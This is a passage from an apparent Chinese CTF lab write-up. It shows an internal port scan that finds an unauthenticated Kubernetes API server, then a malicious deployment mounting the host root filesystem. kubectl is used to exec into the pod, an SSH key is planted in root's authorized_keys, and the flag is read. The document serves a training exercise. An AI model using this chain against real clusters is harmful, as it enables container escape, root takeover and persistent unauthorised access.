(www-data:/var/www/html/OAsystem/upload) $ cat 1.txt
172.22.14.37:22 open
172.22.14.37:2380 open
172.22.14.37:2379 open
172.22.14.37:6443 open
172.22.14.37:10256 open
172.22.14.37:10250 open
172.22.14.37:10252 open
172.22.14.37:10251 open
[*] WebTitle http://172.22.14.37:10251 code:404 len:19     title:None
[*] WebTitle http://172.22.14.37:10252 code:404 len:19     title:None
[*] WebTitle http://172.22.14.37:10256 code:404 len:19     title:None
[*] WebTitle https://172.22.14.37:6443 code:200 len:4671   title:None
[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None
[+] PocScan https://172.22.14.37:6443 poc-yaml-go-pprof-leak 
[+] PocScan https://172.22.14.37:6443 poc-yaml-kubernetes-unauth
```

存在`6443`等端口，存在 `Kubernetes API server` 未授权访问

![image.png](image62.png)

`kubectl.exe`：https://storage.googleapis.com/kubernetes-release/release/v1.7.0/bin/windows/amd64/kubectl.exe

编写恶意`yaml`文件`evil.yaml`

```bash
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
  labels:
    app: nginx
spec:
  replicas: 1
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: nginx:1.8
        volumeMounts:
        - mountPath: /mnt
          name: test-volume
      volumes:
      - name: test-volume
        hostPath:
          path: /
```

```bash
kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f evil.yaml
```

```bash
kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -n default
```

```bash
kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment-864f8bfd6f-zfgqd /bin/bash
```

```bash
echo "ssh-rsa xxxx" > /mnt/root/.ssh/authorized_keys
```

`ssh`私钥登录

```bash
ssh -i /home/kali/.ssh/id_rsa root@172.22.14.37
```

```bash
use flaghaha;
select * from flag04;
```

```bash
ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==
flag{da69c459-7fe5-4535-b8d1-15fff496a29f}
```

## 总结

见到自己的很多不足，以及很多没用过，比如最后的`K8s` 未授权，还有中间的`PWN`

后面补全`K8s` 的知识，以后再复盘该靶机